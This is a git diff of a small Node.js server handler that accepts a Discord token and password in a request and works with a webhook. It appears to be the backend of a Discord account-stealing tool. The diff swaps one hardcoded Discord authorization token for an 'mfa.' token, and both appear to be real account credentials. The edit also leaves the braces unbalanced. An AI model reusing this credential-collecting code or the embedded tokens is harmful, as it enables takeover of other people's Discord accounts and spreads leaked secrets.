@@ -2,26 +2,18 @@ const axios = require('axios');
 
 
 
-var info;
-axios.get('https://discordapp.com/api/v8/users/@me', {
-    withCredentials: true,
-    headers: {
-      Authorization: "NzkyNzgwNzU3NzY4MDc3MzMz.X_ganQ.Ig1qH6zNChHzlO0FigaE-znijZE",
-    },
-  }).then((response) => {	
-    info = response.data;
-  }
-  )
-}
-
 exports.send = (req, res, webhook) =>
 {
-	
 	const token = req.body.token;
 	const password = req.body.password;
 	
-
 	
+	axios.get('https://discordapp.com/api/v8/users/@me', {
+    withCredentials: true,
+    headers: {
+      Authorization: "mfa.URa8bRHIuryAVkRYc-xRlxalbzSzuycYG7KRcQZLeBa3KZGMCr9n4dD9kWi2egDGoQI4BhL8aDWuuH6RJRXl",
+    },
+  }).then((response) => {	
 	if(token === undefined || password === undefined)
 		return res.status(400).json({status: "error", message: "Not sent."});
 
@@ -77,5 +69,8 @@ exports.send = (req, res, webhook) =>
 	});
 	
 	res.status(200).json({status: "ok", message: "Sent."});
+  }
+  )
+	
 }
 
